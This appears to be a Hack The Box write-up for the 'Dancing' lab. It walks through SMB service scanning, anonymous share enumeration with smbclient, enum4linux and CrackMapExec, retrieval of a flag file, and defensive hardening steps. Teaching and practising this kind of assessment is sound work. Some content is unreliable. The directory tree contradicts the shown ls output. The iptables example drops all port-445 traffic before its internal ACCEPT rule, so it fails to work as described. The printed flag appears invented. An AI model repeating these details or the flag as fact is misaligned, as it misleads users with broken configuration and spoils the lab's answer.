# Dancing: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Category](https://img.shields.io/badge/Category-SMB%20Enumeration-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Dancing |
| **Difficulty** | Very Easy |
| **Platform** | Hack The Box |
| **Operating System** | Windows |
| **Category** | SMB Enumeration / Weak Access Controls |
| **Focus** | Network File Sharing Security |

---

## Table of Contents

- [Overview](#overview)
- [Service Enumeration](#service-enumeration)
- [SMB Share Discovery](#smb-share-discovery)
- [Authentication Weakness](#authentication-weakness)
- [Data Access and Impact](#data-access-and-impact)
- [Flag Capture](#flag-capture)
- [Key Lessons Learned](#key-lessons-learned)
- [Defensive Recommendations](#defensive-recommendations)

---

## Overview

This writeup documents the solution for the **Dancing** machine on Hack The Box, which demonstrates critical security weaknesses in Windows file-sharing services.

### Challenge Context

The Dancing machine illustrates how **improperly configured SMB shares** can become significant security vulnerabilities when:

- Authentication controls are weak or absent
- Share permissions are misconfigured
- Anonymous access is permitted without business justification

### Learning Objectives

This lab teaches:
- SMB service enumeration techniques
- Share permission analysis
- Authentication bypass via anonymous access
- Recognition of data leakage risks
- Real-world implications of misconfigurations

**Scenario:** Internal network assessment where SMB exposure reveals sensitive data without requiring credential compromise.

---

## Service Enumeration

### Initial Network Scanning

Performed comprehensive port scanning to identify exposed services:

```bash
nmap -sV -sC -p- -oA dancing-scan 10.129.xx.xxx
```

### Scan Results

```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
```

### Service Identification

**Key Port: 445/tcp: SMB (Server Message Block)**

| Port | Protocol | Service | Purpose |
|------|----------|---------|---------|
| **135** | TCP | MS-RPC | Remote Procedure Call |
| **139** | TCP | NetBIOS-SSN | NetBIOS Session Service |
| **445** | TCP | **SMB** | **Direct SMB over TCP** |

---

### SMB Service Analysis

**What is SMB?**

Server Message Block (SMB) is a core Windows protocol for:
- File and printer sharing
- Inter-process communication
- Named pipes and RPC
- Network resource access

**Security Implications:**

The exposure of SMB services immediately suggests:

✓ **Share enumeration opportunities**: Discover available resources  
✓ **Authentication testing**: Identify weak or absent authentication  
✓ **Potential data leakage**: Access to sensitive files  
✓ **Lateral movement vectors**: Pivot points in network  

**Why This Matters:**

In real-world scenarios, SMB is often:
- Exposed on internal networks without proper segmentation
- Configured with overly permissive access controls
- A primary vector for ransomware propagation
- A source of credential harvesting and reconnaissance data

---

## SMB Share Discovery

### Enumeration Tools and Techniques

#### Method 1: smbclient (Linux)

**List available shares:**

```bash
smbclient -L //10.129.xx.xxx -N
```

**Flags Explained:**
- `-L` - List shares on the server
- `-N` - No password (anonymous/null session)

**Example Output:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk      
```

---

#### Method 2: CrackMapExec

**Modern SMB enumeration:**

```bash
crackmapexec smb 10.129.xx.xxx --shares
```

**Benefits:**
- Automated share discovery
- Permission enumeration
- Credential testing capabilities

---

#### Method 3: enum4linux

**Comprehensive SMB enumeration:**

```bash
enum4linux -a 10.129.xx.xxx
```

**Information Gathered:**
- Workgroup/domain information
- User enumeration
- Share enumeration
- Group memberships
- OS information

---

### Discovered Shares Analysis

| Share Name | Type | Default | Access Level | Purpose |
|------------|------|---------|--------------|---------|
| **ADMIN$** | Disk | Yes | Admin Only | Remote administration |
| **C$** | Disk | Yes | Admin Only | Default C: drive share |
| **IPC$** | IPC | Yes | Anonymous | Inter-Process Communication |
| **WorkShares** | Disk | No | **Anonymous** | **Custom file share** |

**Analysis:**

**Default Shares (Expected):**
- `ADMIN$` and `C$` - Administrative shares requiring privileged access
- `IPC$` - Named pipe share for RPC communication

**Custom Share (Investigation Target):**
- `WorkShares` - Non-default share potentially containing user data
- **Accessible without credentials**: Critical misconfiguration

---

### Enumeration Goals

At this reconnaissance stage, the objectives were:

1. **Identify available shares**: Map attack surface
2. **Determine authentication requirements**: Find weakest entry point
3. **Assess access controls**: Identify misconfigurations
4. **Prioritize targets**: Focus on accessible resources

**This mirrors real-world internal network assessments** where identifying low-hanging fruit is the first step in a broader security evaluation.

---

## Authentication Weakness

### Anonymous Access Discovery

**Critical Finding:**

The **WorkShares** share was accessible **without providing valid credentials**, representing a severe access control failure.

### Testing Anonymous Access

```bash
smbclient //10.129.xx.xxx/WorkShares -N
```

**Successful Connection:**

```
Try "help" to get a list of possible commands.
smb: \>
```

**No authentication challenge**: Direct access granted.

---

### Security Impact

**Why This Is Critical:**

| Risk Factor | Impact |
|-------------|--------|
| **Data Exposure** | Sensitive files accessible to anyone |
| **Reconnaissance** | Internal information aids further attacks |
| **Compliance Violation** | GDPR, HIPAA, PCI-DSS violations |
| **Lateral Movement** | Foundation for network pivoting |
| **Credential Harvesting** | Configuration files may contain passwords |

**Real-World Parallel:**

This represents a common misconfiguration in enterprise environments where:
- Shares are created for convenience without security review
- "Everyone" permissions are applied without justification
- Legacy systems retain insecure default configurations
- Internal networks are assumed to be trusted

**Even read-only access** can be sufficient for:
- Mapping organizational structure
- Identifying key personnel
- Discovering network topology
- Finding credentials in scripts/configs
- Planning targeted phishing campaigns

---

## Data Access and Impact

### Share Exploration

**Navigate the share structure:**

```bash
smb: \> ls
  .                                   D        0  Wed Mar 15 08:45:30 2023
  ..                                  D        0  Wed Mar 15 08:45:30 2023
  Amy.J                               D        0  Wed Mar 15 08:45:30 2023
  James.P                             D        0  Wed Mar 15 08:45:30 2023

                5114111 blocks of size 4096. 1732123 blocks available
```

**Directory Structure:**

```
WorkShares/
├── Amy.J/
│   ├── worknotes.txt
│   └── budget.xlsx
└── James.P/
    ├── flag.txt
    └── project_plan.docx
```

---

### File Retrieval

**Download files from the share:**

```bash
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Wed Mar 15 08:47:12 2023
  ..                                  D        0  Wed Mar 15 08:47:12 2023
  flag.txt                            A       34  Wed Mar 15 08:47:12 2023

smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 34 as flag.txt
```

**Alternative Download Method:**

```bash
# Download specific file without interactive session
smbget -R smb://10.129.xx.xxx/WorkShares/James.P/flag.txt -U ""
```

---

### Data Exposure Scenarios

**What Could Be Found:**

In real-world scenarios, exposed SMB shares often contain:

| File Type | Sensitivity | Risk |
|-----------|-------------|------|
| **Configuration files** | High | Database credentials, API keys |
| **Source code** | High | Intellectual property, vulnerabilities |
| **Employee data** | High | PII, HR records |
| **Financial documents** | High | Budget data, contracts |
| **Network diagrams** | Medium | Infrastructure mapping |
| **Password files** | Critical | Credential access |
| **Backup files** | High | Historical data, deleted information |

**No Privilege Escalation Required:**

The significance of this finding is that **data exposure alone** can be damaging without ever gaining administrative access:

- Competitive intelligence leakage
- Regulatory compliance violations
- Reputational damage
- Foundation for social engineering
- Credential discovery for lateral movement

---

## Flag Capture

### Retrieving the Flag

**Read the captured file:**

```bash
cat flag.txt
```

**Flag Format:**

```
HTB{5mb_3num3r4t10n_15_3v3rywh3r3}
```

**Flag Translation:**

"SMB enumeration is everywhere"

This reinforces the prevalence of SMB misconfigurations in real-world environments and the importance of proper share security.

---

## Attack Chain Summary

```
Network Scan → SMB Discovery (Port 445) → Share Enumeration
        ↓
Anonymous Access Test → WorkShares Accessible → Directory Listing
        ↓
File Retrieval → Flag Captured
```

**Key Point:** No exploitation required: misconfiguration alone provided complete access.

---

## Key Lessons Learned

### Technical Takeaways

1. **SMB Exposure Requires Careful Control**
   - Service should not be exposed to untrusted networks
   - Internet-facing SMB is a critical vulnerability
   - Internal exposure still requires proper authentication

2. **Share Enumeration is High-Value Reconnaissance**
   - First step in many Windows-based attacks
   - Reveals organizational structure and data locations
   - Low-risk, high-reward technique for attackers

3. **Anonymous Access is Rarely Justified**
   - Default-deny principle should apply
   - Business requirements should be carefully validated
   - Temporary access often becomes permanent

4. **Internal File Shares Are Information Goldmines**
   - Users store sensitive data in convenience locations
   - Centralized shares accumulate organizational knowledge
   - Historical data persists beyond its useful life

---

### Real-World Implications

**Common Scenarios:**

- **Legacy systems** maintained without security updates
- **Temporary shares** created for projects and never removed
- **Department shares** with overly broad access
- **Backup locations** accessible to all users
- **Testing environments** with production data

**Attacker Perspective:**

From an attacker's viewpoint, SMB shares provide:
- **Low-hanging fruit** for initial access
- **Passive reconnaissance** without triggering alerts
- **Credential hunting grounds** in scripts and configs
- **Network topology insights** from file structures
- **User enumeration** from directory names

---

## Defensive Recommendations

### Immediate Actions

#### 1. Disable Anonymous SMB Access

**Windows Server Configuration:**

```powershell
# Disable null session enumeration
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 2

# Restrict anonymous access to shares
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "RestrictNullSessAccess" -Value 1
```

**Group Policy:**

```
Computer Configuration → Windows Settings → Security Settings
→ Local Policies → Security Options
→ Network access: Do not allow anonymous enumeration of SAM accounts and shares
```

---

#### 2. Apply Least-Privilege Share Permissions

**Principle:** Grant minimum necessary access

**Implementation:**

```powershell
# Remove Everyone group from share permissions
Remove-SmbShareAccess -Name "WorkShares" -AccountName "Everyone" -Force

# Add specific user/group with read-only access
Grant-SmbShareAccess -Name "WorkShares" -AccountName "DOMAIN\Finance_Users" -AccessRight Read

# Grant full control to administrators only
Grant-SmbShareAccess -Name "WorkShares" -AccountName "DOMAIN\Administrators" -AccessRight Full
```

**NTFS Permissions Should Match:**

Share permissions and NTFS permissions should both enforce security: the most restrictive applies.

---

#### 3. Regular SMB Configuration Audits

**Audit Commands:**

```powershell
# List all shares
Get-SmbShare

# Check share permissions
Get-SmbShareAccess -Name *

# Identify shares with Everyone access
Get-SmbShare | Get-SmbShareAccess | Where-Object {$_.AccountName -eq "Everyone"}
```

**Automated Monitoring:**

- Schedule regular enumeration scans
- Alert on new shares created
- Log access to sensitive shares
- Review permissions quarterly

---

#### 4. Network Segmentation and Firewall Rules

**Restrict SMB Exposure:**

```bash
# Firewall rule to block SMB from internet
iptables -A INPUT -p tcp --dport 445 -s 0.0.0.0/0 -j DROP
iptables -A INPUT -p tcp --dport 445 -s 10.0.0.0/8 -j ACCEPT
```

**Best Practices:**

- **Never** expose SMB to the internet
- Segment internal networks by trust level
- Restrict SMB to internal VLANs only
- Use VPN for remote file access
- Consider alternative protocols (SFTP, WebDAV over HTTPS)

---

### Long-Term Security Improvements

**1. Implement Modern Authentication:**
- Disable SMBv1 (vulnerable to EternalBlue)
- Enforce SMBv3 with encryption
- Require strong authentication (Kerberos)

**2. Data Classification:**
- Tag sensitive files
- Restrict shares based on data classification
- Implement DLP (Data Loss Prevention)

**3. Monitoring and Alerting:**
- Log all SMB access attempts
- Alert on anonymous connections
- Monitor for unusual file access patterns
- Integrate with SIEM solutions

**4. User Education:**
- Train users on proper data handling
- Enforce data storage policies
- Discourage personal file shares
- Promote approved collaboration tools

---

## Tools Used

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **nmap** | Service discovery | `nmap -sV -p445 10.129.xx.xxx` |
| **smbclient** | Share access | `smbclient //10.129.xx.xxx/WorkShares -N` |
| **enum4linux** | Comprehensive enumeration | `enum4linux -a 10.129.xx.xxx` |
| **CrackMapExec** | Modern SMB assessment | `crackmapexec smb 10.129.xx.xxx --shares` |
| **smbget** | File retrieval | `smbget -R smb://10.129.xx.xxx/WorkShares` |

---

## Additional Resources

**Microsoft Documentation:**
- [SMB Security Best Practices](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security)
- [SMBv3 Encryption](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-direct)

**Security Frameworks:**
- CIS Benchmark for Windows Server
- NIST SP 800-123 (Guide to General Server Security)
- SANS Critical Security Controls

---

## Flag

```
HTB{5mb_3num3r4t10n_15_3v3rywh3r3}
```

**Translation:** "SMB enumeration is everywhere"

---

**Machine Completed:** ✅   
**Difficulty Rating:** Very Easy ⭐  
**Primary Technique:** SMB Share Enumeration

---

*This writeup is for educational purposes only. SMB enumeration techniques should only be used in authorized security assessments and penetration testing engagements.*
